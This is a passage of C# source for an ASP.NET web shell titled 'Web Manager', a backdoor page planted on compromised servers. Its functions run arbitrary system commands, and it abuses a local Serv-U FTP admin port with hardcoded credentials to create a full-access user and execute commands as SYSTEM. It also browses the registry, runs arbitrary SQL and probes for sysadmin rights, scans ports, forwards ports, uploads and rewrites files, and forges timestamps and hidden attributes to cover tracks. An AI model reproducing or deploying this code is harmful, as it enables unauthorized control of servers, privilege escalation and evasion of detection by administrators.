string mtoJb="-DELETEDOMAIN\r\n-IP=0.0.0.0\r\n PortNo=52521\r\n";
string sutI="-SETDOMAIN\r\n-Domain=BIN|0.0.0.0|52521|-1|1|0\r\n-TZOEnable=0\r\n TZOKey=\r\n";
string iVDT="-SETUSERSETUP\r\n-IP=0.0.0.0\r\n-PortNo=52521\r\n-User=bin\r\n-Password=binftp\r\n-HomeDir=c:\\\r\n-LoginMesFile=\r\n-Disable=0\r\n-RelPaths=1\r\n-NeedSecure=0\r\n-HideHidden=0\r\n-AlwaysAllowLogin=0\r\n-ChangePassword=0\r\n-QuotaEnable=0\r\n-MaxUsersLoginPerIP=-1\r\n-SpeedLimitUp=0\r\n-SpeedLimitDown=0\r\n-MaxNrUsers=-1\r\n-IdleTimeOut=600\r\n-SessionTimeOut=-1\r\n-Expire=0\r\n-RatioDown=1\r\n-RatiosCredit=0\r\n-QuotaCurrent=0\r\n-QuotaMaximum=0\r\n-Maintenance=System\r\n-PasswordType=Regular\r\n-Ratios=NoneRN\r\n Access=c:\\|RWAMELCDP\r\n";
string zexn="QUIT\r\n";
UHlA.Visible=true;
try
{
tcp.Connect("127.0.0.1",port);
tcp.ReceiveBufferSize=1024;
NS=tcp.GetStream();
Rev(NS);
ZJiM(NS,CRtK);
Rev(NS);
ZJiM(NS,jnNG);
Rev(NS);
ZJiM(NS,site);
Rev(NS);
ZJiM(NS,mtoJb);
Rev(NS);
ZJiM(NS,sutI);
Rev(NS);
ZJiM(NS,iVDT);
Rev(NS);
Bin_Td_Res.InnerHtml+="<font color=\"green\"><b>Exec Cmd.................\r\n</b></font>";
zvxm.Connect(Request.ServerVariables["LOCAL_ADDR"],52521);
NS1=zvxm.GetStream();
Rev(NS1);
ZJiM(NS1,"user bin\r\n");
Rev(NS1);
ZJiM(NS1,"pass binftp\r\n");
Rev(NS1);
ZJiM(NS1,"site exec "+cmd+"\r\n");
Rev(NS1);
ZJiM(NS1,"quit\r\n");
Rev(NS1);
zvxm.Close();
ZJiM(NS,mtoJb);
Rev(NS);
tcp.Close();
}
catch(Exception error)
{
xseuB(error.Message);
}
}
protected void Rev(NetworkStream instream)
{
string FTBtf=string.Empty;
if(instream.CanRead)
{
byte[] uPZ=new byte[1024];
do
{
System.Threading.Thread.Sleep(50);
int len=instream.Read(uPZ,0,uPZ.Length);
FTBtf+=Encoding.Default.GetString(uPZ,0,len);
}
while(instream.DataAvailable);
}
Bin_Td_Res.InnerHtml+="<font color=red>"+FTBtf.Replace("\0","")+"</font>";
}
protected void ZJiM(NetworkStream instream,string Sendstr)
{
if(instream.CanWrite)
{
byte[] uPZ=Encoding.Default.GetBytes(Sendstr);
instream.Write(uPZ,0,uPZ.Length);
}
Bin_Td_Res.InnerHtml+="<font color=blue>"+Sendstr+"</font>";
}
public void xFhz()
{
WICxe();
kkHN.Visible=true;
Bin_H2_Title.InnerText="注册表查询 >>";
string txc=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";
vyX.Text="";
foreach(string rootkey in txc.Split('|'))
{
vyX.Text+="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(rootkey)+"')\">"+rootkey+"</a> | ";
}
lFAvw();
}
protected void lFAvw()
{
qPdI.Text="";
string txc=@"HKEY_LOCAL_MACHINE|HKEY_CLASSES_ROOT|HKEY_CURRENT_USER|HKEY_USERS|HKEY_CURRENT_CONFIG";
TableRow tr;
TableCell tc;
foreach(string rootkey in txc.Split('|'))
{
tr=new TableRow();
tc=new TableCell();
string bg=OKM();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tc.Width=Unit.Parse("40%");
tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(rootkey)+"')\">"+rootkey+"</a>";
tr.Cells.Add(tc);
tc=new TableCell();
tc.Width=Unit.Parse("60%");
tc.Text="&lt;RootKey&gt;";
tr.Cells.Add(tc);
pLWD.Rows.Add(tr);
}
}
protected void tpRQ(string Reg_Path)
{
if(!Reg_Path.EndsWith("\\"))
{
Reg_Path=Reg_Path+"\\";
}
qPdI.Text=Reg_Path;
string cJG=Regex.Replace(Reg_Path,@"\\[^\\]+\\?$","");
cJG=Regex.Replace(cJG,@"\\+","\\");
TableRow tr=new TableRow();
TableCell tc=new TableCell();
string bg=OKM();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(cJG)+"')\">Parent Key</a>";
tc.Attributes["colspan"]="2" ;
tr.Cells.Add(tc);
pLWD.Rows.Add(tr);
try
{
string subpath;
string kDgkX=Reg_Path.Substring(Reg_Path.IndexOf("\\")+1,Reg_Path.Length-Reg_Path.IndexOf("\\")-1);
RegistryKey rk=null;
RegistryKey sk;
if(Reg_Path.StartsWith("HKEY_LOCAL_MACHINE"))
{
rk=Registry.LocalMachine;
}
else if(Reg_Path.StartsWith("HKEY_CLASSES_ROOT"))
{
rk=Registry.ClassesRoot;
}
else if(Reg_Path.StartsWith("HKEY_CURRENT_USER"))
{
rk=Registry.CurrentUser;
}
else if(Reg_Path.StartsWith("HKEY_USERS"))
{
rk=Registry.Users;
}
else if(Reg_Path.StartsWith("HKEY_CURRENT_CONFIG"))
{
rk=Registry.CurrentConfig;
}
if(kDgkX.Length>1)
{
sk=rk.OpenSubKey(kDgkX);
}
else
{
sk=rk;
}
foreach(string innerSubKey in sk.GetSubKeyNames())
{
tr=new TableRow();
tc=new TableCell();
bg=OKM();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tc.Width=Unit.Parse("40%");
tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Regread','"+MVVJ(Reg_Path+innerSubKey)+"')\">"+innerSubKey+"</a>";
tr.Cells.Add(tc);
tc=new TableCell();
tc.Width=Unit.Parse("60%");
tc.Text="&lt;SubKey&gt;";
tr.Cells.Add(tc);
pLWD.Rows.Add(tr);
}
TableRow cKVA=new TableRow();
cKVA.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";
cKVA.Attributes["bgcolor"]="#dddddd";
TableCell JlmW=new TableCell();
JlmW.Attributes["colspan"]="2" ;
JlmW.Attributes["height"]="5";
cKVA.Cells.Add(JlmW);
pLWD.Rows.Add(cKVA);
foreach(string strValueName in sk.GetValueNames())
{
tr=new TableRow();
tc=new TableCell();
bg=OKM();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tc.Width=Unit.Parse("40%");
tc.Text=strValueName;
tr.Cells.Add(tc);
tc=new TableCell();
tc.Width=Unit.Parse("60%");
tc.Text=DdmPl(sk,strValueName);
tr.Cells.Add(tc);
pLWD.Rows.Add(tr);
}
}
catch(Exception error)
{
xseuB(error.Message);
}
}
public string DdmPl(RegistryKey sk,string strValueName)
{
object uPZ;
string RaTGr="";
try
{
uPZ=sk.GetValue(strValueName,"NULL");
if(uPZ.GetType()==typeof(byte[]))
{
foreach(byte tmpbyte in(byte[])uPZ)
{
if((int)tmpbyte<16)
{
RaTGr+="0";
}
RaTGr+=tmpbyte.ToString("X");
}
}
else if(uPZ.GetType()==typeof(string[]))
{
foreach(string tmpstr in(string[])uPZ)
{
RaTGr+=tmpstr;
}
}
else
{
RaTGr=uPZ.ToString();
}
}
catch(Exception error)
{
xseuB(error.Message);
}
return RaTGr;
}
public void vNCHZ()
{
WICxe();
YwLB.Visible=true;
Bin_H2_Title.InnerText="端口扫描 >>";
}
public void rAhe()
{
WICxe();
iDgmL.Visible=true;
dQIIF.Visible=false;
Bin_H2_Title.InnerText="数据库 >>";
}
protected void OUj()
{
if(Dtdr.State==ConnectionState.Closed)
{
try
{
Dtdr.ConnectionString=MasR.Text;
Kkvb.Connection=Dtdr;
Dtdr.Open();
}
catch(Exception Error)
{
xseuB(Error.Message);
}
}
}
protected void fUzE()
{
if(Dtdr.State==ConnectionState.Open)
Dtdr.Close();
Dtdr.Dispose();
Kkvb.Dispose();
}
public DataTable CYUe(string sqlstr)
{
OleDbDataAdapter da=new OleDbDataAdapter();
DataTable Dstog=new DataTable();
try
{
OUj();
Kkvb.CommandType=CommandType.Text;
Kkvb.CommandText=sqlstr;
da.SelectCommand=Kkvb;
da.Fill(Dstog);
}
catch(Exception)
{
}
finally
{
fUzE();
}
return Dstog;
}
public DataTable[] Bin_Data(string query)
{
ArrayList list=new ArrayList();
try
{
string str;
OUj();
query=query+"\r\n";
MatchCollection gcod=new Regex("[\r\n][gG][oO][\r\n]").Matches(query);
int EmRX=0;
for(int i=0;i<gcod.Count;i++)
{
Match FJD=gcod[i];
str=query.Substring(EmRX,FJD.Index-EmRX);
if(str.Trim().Length>0)
{
OleDbDataAdapter FgzeQ=new OleDbDataAdapter();
Kkvb.CommandType=CommandType.Text;
Kkvb.CommandText=str.Trim();
FgzeQ.SelectCommand=Kkvb;
DataSet cDPp=new DataSet();
FgzeQ.Fill(cDPp);
for(int j=0;j<cDPp.Tables.Count;j++)
{
list.Add(cDPp.Tables[j]);
}
}
EmRX=FJD.Index+3;
}
str=query.Substring(EmRX,query.Length-EmRX);
if(str.Trim().Length>0)
{
OleDbDataAdapter VwB=new OleDbDataAdapter();
Kkvb.CommandType=CommandType.Text;
Kkvb.CommandText=str.Trim();
VwB.SelectCommand=Kkvb;
DataSet arG=new DataSet();
VwB.Fill(arG);
for(int k=0;k<arG.Tables.Count;k++)
{
list.Add(arG.Tables[k]);
}
}
}
catch(SqlException e)
{
xseuB(e.Message);
rom.Visible=false;
}
return(DataTable[])list.ToArray(typeof(DataTable));
}
public void JIAKU(string instr)
{
try
{
OUj();
Kkvb.CommandType=CommandType.Text;
Kkvb.CommandText=instr;
Kkvb.ExecuteNonQuery();
}
catch(Exception e)
{
xseuB(e.Message);
}
}
public void dwgT()
{
try
{
OUj();
if(WYmo.SelectedItem.Text=="MSSQL")
{
if(Pvf.SelectedItem.Value!="")
{
Dtdr.ChangeDatabase(Pvf.SelectedItem.Value.ToString());
}
}
DataTable[] jxF=null;
jxF=Bin_Data(jHIy.InnerText);
if(jxF!=null && jxF.Length>0)
{
for(int j=0;j<jxF.Length;j++)
{
rom.PreRender+=new EventHandler(lRavM);
rom.DataSource=jxF[j];
rom.DataBind();
for(int i=0;i<rom.Items.Count;i++)
{
string bg=OKM();
rom.Items[i].CssClass=bg;
rom.Items[i].Attributes["onmouseover"]="this.className='focus';";
rom.Items[i].Attributes["onmouseout"]="this.className='"+bg+"';";
}
}
}
else
{
rom.DataSource=null;
rom.DataBind();
}
rom.Visible=true;
}
catch(Exception e)
{
xseuB(e.Message);
rom.Visible=false;
}
}
public void xTZY()
{
try
{
if(WYmo.SelectedItem.Text=="MSSQL")
{
if(Pvf.SelectedItem.Value=="")
{
rom.DataSource=null;
rom.DataBind();
return;
}
}
OUj();
DataTable zKvOw=new DataTable();
DataTable jxF=new DataTable();
DataTable baVJV=new DataTable();
if(WYmo.SelectedItem.Text=="MSSQL" && Pvf.SelectedItem.Value!="")
{
Dtdr.ChangeDatabase(Pvf.SelectedItem.Text);
}
zKvOw=Dtdr.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,"SYSTEM TABLE" });
jxF=Dtdr.GetOleDbSchemaTable(OleDbSchemaGuid.Tables,new Object[] { null,null,null,"TABLE" });
foreach(DataRow dr in zKvOw.Rows)
{
jxF.ImportRow(dr);
}
jxF.Columns.Remove("TABLE_CATALOG");jxF.Columns.Remove("TABLE_SCHEMA");jxF.Columns.Remove("DESCRIPTION");jxF.Columns.Remove("TABLE_PROPID");
rom.PreRender+=new EventHandler(lRavM);
rom.DataSource=jxF;
rom.DataBind();
for(int i=0;i<rom.Items.Count;i++)
{
string bg=OKM();
rom.Items[i].CssClass=bg;
rom.Items[i].Attributes["onmouseover"]="this.className='focus';";
rom.Items[i].Attributes["onmouseout"]="this.className='"+bg+"';";
}
rom.Visible=true;
}
catch(Exception e)
{
xseuB(e.Message);
rom.Visible=false;
}
}
private void lRavM(object sender,EventArgs e)
{
DataGrid d=(DataGrid)sender;
foreach(DataGridItem item in d.Items)
{
foreach(TableCell t in item.Cells)
{
t.Text=t.Text.Replace("<","&lt;").Replace(">","&gt;");
}
}
}
public void vCf()
{
dQIIF.Visible=true;
try
{
jHIy.InnerHtml=string.Empty;
if(WYmo.SelectedItem.Text=="MSSQL")
{
rom.Visible=false;
uXevN.Visible=true;
irTU.Visible=true;
OUj();
DataTable ver=CYUe(@"SELECT @@VERSION");
DataTable dbs=CYUe(@"SELECT name FROM master.dbo.sysdatabases");
DataTable cdb=CYUe(@"SELECT DB_NAME()");
DataTable rol=CYUe(@"SELECT IS_SRVROLEMEMBER('sysadmin')");
DataTable YKrm=CYUe(@"SELECT IS_MEMBER('db_owner')");
string jHlh=ver.Rows[0][0].ToString();
string dbo=string.Empty;
if(YKrm.Rows[0][0].ToString()=="1")
{
dbo="db_owner";
}
else
{
dbo="public";
}
if(rol.Rows[0][0].ToString()=="1")
{
dbo="<font color=blue>sa</font>";
}
string db_name=string.Empty;
foreach(ListItem item in FGEy.Items)
{
 if(item.Selected=true)
 {
 item.Selected=false;
 }
}
Pvf.Items.Clear();
Pvf.Items.Add("-- Select a DataBase --");
Pvf.Items[0].Value="";
for(int i=0;i<dbs.Rows.Count;i++)
{
db_name+=dbs.Rows[i][0].ToString().Replace(cdb.Rows[0][0].ToString(),"<font color=blue>"+cdb.Rows[0][0].ToString()+"</font>")+"&nbsp;|&nbsp;";
Pvf.Items.Add(dbs.Rows[i][0].ToString());
}
irTU.InnerHtml="<p><font color=red>MSSQL Version</font> : <i><b>"+jHlh+"</b></i></p><p><font color=red>SrvRoleMember</font> : <i><b>"+dbo+"</b></i></p>";
}
else
{
uXevN.Visible=false;
irTU.Visible=false;
xTZY();
}
}
catch(Exception e)
{
dQIIF.Visible=false;
}
}
public void MHLv()
{
WICxe();
hOWTm.Visible=true;
Bin_H2_Title.InnerText="端口映射 >>";
}
public class PortForward
{
public string Localaddress;
public int LocalPort;
public string RemoteAddress;
public int RemotePort;
string type;
Socket ltcpClient;
Socket rtcpClient;
Socket server;
byte[] DPrPL=new byte[2048];
byte[] wvZv=new byte[2048];
public struct session
{
public Socket rdel;
public Socket ldel;
public int llen;
public int rlen;
}
public static IPEndPoint mtJ(string host,int port)
{
IPEndPoint iep=null;
IPHostEntry aGN=Dns.Resolve(host);
IPAddress rmt=aGN.AddressList[0];
iep=new IPEndPoint(rmt,port);
return iep;
}
public void Start(string Rip,int Rport,string lip,int lport)
{
try
{
LocalPort=lport;
RemoteAddress=Rip;
RemotePort=Rport;
Localaddress=lip;
rtcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
ltcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);
rtcpClient.BeginConnect(mtJ(RemoteAddress,RemotePort),new AsyncCallback(iiGFO),rtcpClient);
}
catch (Exception ex) { }
}
protected void iiGFO(IAsyncResult ar)
{
try
{
session RKXy=new session();
RKXy.ldel=ltcpClient;
RKXy.rdel=rtcpClient;
ltcpClient.BeginConnect(mtJ(Localaddress,LocalPort),new AsyncCallback(VTp),RKXy);
}
catch (Exception ex) { }
}
protected void VTp(IAsyncResult ar)
{
try
{
session RKXy=(session)ar.AsyncState;
ltcpClient.EndConnect(ar);
RKXy.rdel.BeginReceive(DPrPL,0,DPrPL.Length,SocketFlags.None,new AsyncCallback(LFYM),RKXy);
RKXy.ldel.BeginReceive(wvZv,0,wvZv.Length,SocketFlags.None,new AsyncCallback(xPS),RKXy);
}
catch (Exception ex) { }
}
private void LFYM(IAsyncResult ar)
{
try
{
session RKXy=(session)ar.AsyncState;
int Ret=RKXy.rdel.EndReceive(ar);
if (Ret>0)
ltcpClient.BeginSend(DPrPL,0,Ret,SocketFlags.None,new AsyncCallback(JTcp),RKXy);
else lyTOK();
}
catch (Exception ex) { }
}
private void JTcp(IAsyncResult ar)
{
try
{
session RKXy=(session)ar.AsyncState;
RKXy.ldel.EndSend(ar);
RKXy.rdel.BeginReceive(DPrPL,0,DPrPL.Length,SocketFlags.None,new AsyncCallback(this.LFYM),RKXy);
}
catch (Exception ex) { }
}
private void xPS(IAsyncResult ar)
{
try
{
session RKXy=(session)ar.AsyncState;
int Ret=RKXy.ldel.EndReceive(ar);
if (Ret>0)
RKXy.rdel.BeginSend(wvZv,0,Ret,SocketFlags.None,new AsyncCallback(IZU),RKXy);
else lyTOK();
}
catch (Exception ex) { }
}
private void IZU(IAsyncResult ar)
{
try
{
session RKXy=(session)ar.AsyncState;
RKXy.rdel.EndSend(ar);
RKXy.ldel.BeginReceive(wvZv,0,wvZv.Length,SocketFlags.None,new AsyncCallback(this.xPS),RKXy);
}
catch (Exception ex) { }
}
public void lyTOK()
{
try
{
if (ltcpClient!=null)
{
ltcpClient.Close();
}
if (rtcpClient!=null)
rtcpClient.Close();
}
catch (Exception ex) { }
}
}
protected void vuou()
{
PortForward gYP=new PortForward();
gYP.lyTOK();
}
protected void ruQO()
{
PortForward gYP=new PortForward();
gYP.Start(llH.Value,int.Parse(ZHS.Value),eEpm.Value,int.Parse(iXdh.Value));
}
public string mRDl(string instr)
{
string tmp=null;
try
{
tmp=System.Net.Dns.Resolve(instr).AddressList[0].ToString();
}
catch(Exception e)
{
}
return tmp;
}
public void VikG()
{
string[] OTV=lOmX.Text.ToString().Split(',');
for(int i=0;i<OTV.Length;i++)
{
IVc.Add(new ScanPort(mRDl(MdR.Text.ToString()),Int32.Parse(OTV[i])));
}
try
{
Thread[] kbXY=new Thread[IVc.Count];
int sdO=0;
for(sdO=0;sdO<IVc.Count;sdO++)
{
kbXY[sdO]=new Thread(new ThreadStart(((ScanPort)IVc[sdO]).Scan));
kbXY[sdO].Start();
}
for(sdO=0;sdO<kbXY.Length;sdO++)
kbXY[sdO].Join();
}
catch
{
}
}
public class ScanPort
{
private string _ip="";
private int jTdO=0;
private TimeSpan _timeSpent;
private string QGcH="Not scanned";
public string ip
{
get { return _ip;}
}
public int port
{
get { return jTdO;}
}
public string status
{
get { return QGcH;}
}
public TimeSpan timeSpent
{
get { return _timeSpent;}
}
public ScanPort(string ip,int port)
{
_ip=ip;
jTdO=port;
}
public void Scan()
{
TcpClient iYap=new TcpClient();
DateTime qYZT=DateTime.Now;
try
{
iYap.Connect(_ip,jTdO);
iYap.Close();
QGcH="<font color=green><b>Open</b></font>";
}
catch
{
QGcH="<font color=red><b>Close</b></font>";
}
_timeSpent=DateTime.Now.Subtract(qYZT);
}
}
public static void YFcNP(System.Web.UI.Page page)
{
page.RegisterHiddenField("__EVENTTARGET","");
page.RegisterHiddenField("__FILE","");
string s=@"<script language=Javascript>";
s+=@"function Bin_PostBack(eventTarget,eventArgument)";
s+=@"{";
s+=@"var theform=document.forms[0];";
s+=@"theform.__EVENTTARGET.value=eventTarget;";
s+=@"theform.__FILE.value=eventArgument;";
s+=@"theform.submit();";
s+=@"} ";
s+=@"</scr"+"ipt>";
page.RegisterStartupScript("",s);
}
protected void PPtK(object sender,EventArgs e)
{
WICxe();
yhv.Visible=true;
Bin_H2_Title.InnerText="文件搜索 >>";
NaLJ.Value=Request.PhysicalApplicationPath;
oJiym.Visible=false;
}
protected void NBy(object sender,EventArgs e)
{
DirectoryInfo GQMM=new DirectoryInfo(NaLJ.Value);
if(!GQMM.Exists)
{
xseuB("Path invalid ! ");
return;
}
oog(GQMM);
xseuB("Search completed ! ");
}
public void oog(DirectoryInfo dir)
{
try
{
oJiym.Visible=true;
foreach(FileInfo Bin_Files in dir.GetFiles())
{
try
{
if(Bin_Files.FullName==Request.PhysicalPath)
{
continue;
}
if(!Regex.IsMatch(Bin_Files.Extension.Replace(".",""),"^("+UDLvA.Value+")$",RegexOptions.IgnoreCase))
{
continue;
}
if(Ven.SelectedItem.Value=="name")
{
if(rAQ.Checked)
{
if(Regex.IsMatch(Bin_Files.Name,iaMKl.Value,RegexOptions.IgnoreCase))
{
FJvQ(Bin_Files);
}
}
else
{
if(Bin_Files.Name.ToLower().IndexOf(iaMKl.Value.ToLower())!=-1)
{
Response.Write(Bin_Files.FullName);
FJvQ(Bin_Files);
}
}
}
else
{
StreamReader sr=new StreamReader(Bin_Files.FullName,Encoding.Default);
string ava=sr.ReadToEnd();
sr.Close();
if(rAQ.Checked)
{
if(Regex.IsMatch(ava,iaMKl.Value,RegexOptions.IgnoreCase))
{
FJvQ(Bin_Files);
if(YZw.Checked)
{
ava=Regex.Replace(ava,iaMKl.Value,qPe.Value,RegexOptions.IgnoreCase);
StreamWriter sw=new StreamWriter(Bin_Files.FullName,false,Encoding.Default);
sw.Write(ava);
sw.Close();
}
}
}
else
{
if(ava.ToLower().IndexOf(iaMKl.Value.ToLower())!=-1)
{
FJvQ(Bin_Files);
if(YZw.Checked)
{
ava=Strings.Replace(ava,iaMKl.Value,qPe.Value,1,-1,CompareMethod.Text);
StreamWriter sw=new StreamWriter(Bin_Files.FullName,false,Encoding.Default);
sw.Write(ava);
sw.Close();
}
}
}
}
}
catch(Exception ex)
{
xseuB(ex.Message);
continue;
}
}
foreach(DirectoryInfo subdir in dir.GetDirectories())
{
oog(subdir);
}
}
catch(Exception ex)
{
xseuB(ex.Message);
}
}
public void FJvQ(FileInfo objfile)
{
TableRow tr=new TableRow();
TableCell tc=new TableCell();
string bg=OKM();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tc.Text="<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(objfile.DirectoryName)+"')\">"+objfile.FullName+"</a>";
tr.Cells.Add(tc);
tc=new TableCell();
tc.Text=objfile.LastWriteTime.ToString();
tr.Cells.Add(tc);
tc=new TableCell();
tc.Text=mTG(objfile.Length);
tr.Cells.Add(tc);
oJiym.Rows.Add(tr);
}
public void xseuB(string instr)
{
jDKt.Visible=true;
jDKt.InnerText=instr;
}
protected void xVm(object sender,EventArgs e)
{
string Jfm=FormsAuthentication.HashPasswordForStoringInConfigFile(HRJ.Text,"MD5").ToLower();
if(Jfm==Password)
{
Response.Cookies.Add(new HttpCookie(vbhLn,Password));
ljtzC.Visible=false;
PBZw();
}
else
{
tZSx();
}
}
protected void Ybg(object sender,EventArgs e)
{
krIR(Server.MapPath("."));
}
protected void KjPi(object sender,EventArgs e)
{
Bin_H2_Title.InnerText="IIS探测 >>";
WICxe();
VNR.Visible=true;
AdCx();
}
protected void DGCoW(object sender,EventArgs e)
{
try
{
StreamWriter sw;
if(NdCX.SelectedItem.Text=="UTF-8")
{
sw=new StreamWriter(Sqon.Value,false,Encoding.UTF8);
}
else
{
sw=new StreamWriter(Sqon.Value,false,Encoding.Default);
}
sw.Write(Xgvv.InnerText);
sw.Close();
xseuB("Save file success !");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(AXSbb.Value);
}
protected void lbjLD(object sender,EventArgs e)
{
string FlwA=AXSbb.Value;
FlwA=OElM(FlwA);
try
{
Fhq.PostedFile.SaveAs(FlwA+Path.GetFileName(Fhq.Value));
xseuB("File upload success!");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(AXSbb.Value);
}
protected void EXV(object sender,EventArgs e)
{
krIR(AXSbb.Value);
}
protected void mcCY(object sender,EventArgs e)
{
krIR(Server.MapPath("."));
}
protected void iVk(object sender,CommandEventArgs e)
{
krIR(e.CommandArgument.ToString());
}
protected void XXrLw(object sender,EventArgs e)
{
try
{
File.SetCreationTimeUtc(QiFB.Value,File.GetCreationTimeUtc(lICp.Value));
File.SetLastAccessTimeUtc(QiFB.Value,File.GetLastAccessTimeUtc(lICp.Value));
File.SetLastWriteTimeUtc(QiFB.Value,File.GetLastWriteTimeUtc(lICp.Value));
xseuB("File time clone success!");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(AXSbb.Value);
}
protected void tIykC(object sender,EventArgs e)
{
string path=pWVL.Value;
try
{
File.SetAttributes(path,FileAttributes.Normal);
if(ZhWSK.Checked)
{
File.SetAttributes(path,FileAttributes.ReadOnly);
}
if(SsR.Checked)
{
File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.System);
}
if(ccB.Checked)
{
File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Hidden);
}
if(fbyZ.Checked)
{
File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Archive);
}
File.SetCreationTimeUtc(path,Convert.ToDateTime(yUqx.Value));
File.SetLastAccessTimeUtc(path,Convert.ToDateTime(aLsn.Value));
File.SetLastWriteTimeUtc(path,Convert.ToDateTime(uYjw.Value));
xseuB("File attributes modify success!");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(AXSbb.Value);
}
protected void VOxn(object sender,EventArgs e)
{
WICxe();
vIac.Visible=true;
Bin_H2_Title.InnerText="执行命令>>";
}
protected void FbhN(object sender,EventArgs e)
{
try
{
Process ahAE=new Process();
ahAE.StartInfo.FileName=kusi.Value;
ahAE.StartInfo.Arguments=bkcm.Value;
ahAE.StartInfo.UseShellExecute=false;
ahAE.StartInfo.RedirectStandardInput=true;
ahAE.StartInfo.RedirectStandardOutput=true;
ahAE.StartInfo.RedirectStandardError=true;
ahAE.Start();
string Uoc=ahAE.StandardOutput.ReadToEnd();
Uoc=Uoc.Replace("<","&lt;");
Uoc=Uoc.Replace(">","&gt;");
Uoc=Uoc.Replace("\r\n","<br>");
tnQRF.Visible=true;
tnQRF.InnerHtml="<hr width=\"100%\" noshade/><pre>"+Uoc+"</pre>";
}
catch(Exception error)
{
xseuB(error.Message);
}
}
protected void RAFL(object sender,EventArgs e)
{
if(qPdI.Text.Length>0)
{
tpRQ(qPdI.Text);
}
else
{
lFAvw();
}
}
protected void Grxk(object sender,EventArgs e)
{
YUw();
}
protected void ilC(object sender,EventArgs e)
{
tZRH();
}
protected void HtB(object sender,EventArgs e)
{
pDVM();
}
protected void Olm(object sender,EventArgs e)
{
iLVUT();
}
protected void jXhS(object sender,EventArgs e)
{
ADCpk();
}
protected void lRfRj(object sender,EventArgs e)
{
lDODR();
}
protected void xSy(object sender,EventArgs e)
{
xFhz();
}
protected void dMx(object sender,EventArgs e)
{
rAhe();
}
protected void zOVO(object sender,EventArgs e)
{
if(((DropDownList)sender).ID.ToString()=="WYmo")
{
dQIIF.Visible=false;
MasR.Text=WYmo.SelectedItem.Value.ToString();
}
if(((DropDownList)sender).ID.ToString()=="Pvf")
{
xTZY();
}
if(((DropDownList)sender).ID.ToString()=="FGEy")
{
jHIy.InnerText=FGEy.SelectedItem.Value.ToString();
}
if(((DropDownList)sender).ID.ToString()=="NdCX")
{
gLKc(Sqon.Value);
}
}
protected void IkkO(object sender,EventArgs e)
{
krIR(AXSbb.Value);
}
protected void BGY(object sender,EventArgs e)
{
vCf();
}
protected void cptS(object sender,EventArgs e)
{
vNCHZ();
}
protected void fDO(object sender,EventArgs e)
{
MHLv();
}
protected void vJNsE(object sender,EventArgs e)
{
vuou();
xseuB("Clear All Thread ......");
}
protected void wDZ(object sender,EventArgs e)
{
if(iXdh.Value=="" || eEpm.Value.Length<7 || ZHS.Value=="")return;
ruQO();
xseuB("All Thread Start ......");
}
protected void tYoZ(object sender,EventArgs e)
{
}
protected void ELkQ(object sender,EventArgs e)
{
VikG();
GBYT.Visible=true;
string res=string.Empty;
foreach(ScanPort th in IVc)
{
res+=th.ip+" : "+th.port+" ................................. "+th.status+"<br>";
}
GBYT.InnerHtml=res;
}
protected void ORUgV(object sender,EventArgs e)
{
dwgT();
}
public void WICxe()
{
DCbS.Visible=false;
CzfO.Visible=false;
APl.Visible=false;
vIac.Visible=false;
kkHN.Visible=false;
YwLB.Visible=false;
iDgmL.Visible=false;
hOWTm.Visible=false;
vrFA.Visible=false;
yhv.Visible=false;
}
</script>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<title>Web Manager</title>
<style type="text/css">
.Bin_Style_Login{font-size: 12px; font-family:Tahoma;background-color:#ddd;border:1px solid #fff;}
body,td{font: 12px Tahoma,Arial;line-height: 16px; background-color:#e6f0ff; color:Black;}
.input{font-size: 12px;background-color:#ddd;border:1px solid #fff;}
.list{font-size: 12px;background-color:#ddd;border:1px solid #fff;}
.area{font-size: 12px;background-color:#ddd;border:1px solid #fff;padding:2px;}
.bt {font-size: 12px;background-color:#ddd;border:1px solid #fff;}
a {color:Black;text-decoration: none;}a:hover{color:Black;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e6f0ff;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e6f0ff;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#3F83AF;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#84B738;padding:5px 10px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:Black;}
ul.info li{margin:0;color:Black;line-height:24px;height:24px;}
u{text-decoration: none;color:Black;float:left;display:block;width:150px;margin-right:10px;}
.u1{text-decoration: none;color:Black;float:left;display:block;width:150px;margin-right:10px;}
.u2{text-decoration: none;color:Black;float:left;display:block;width:350px;margin-right:10px;}
</style>
<script type="text/javascript">
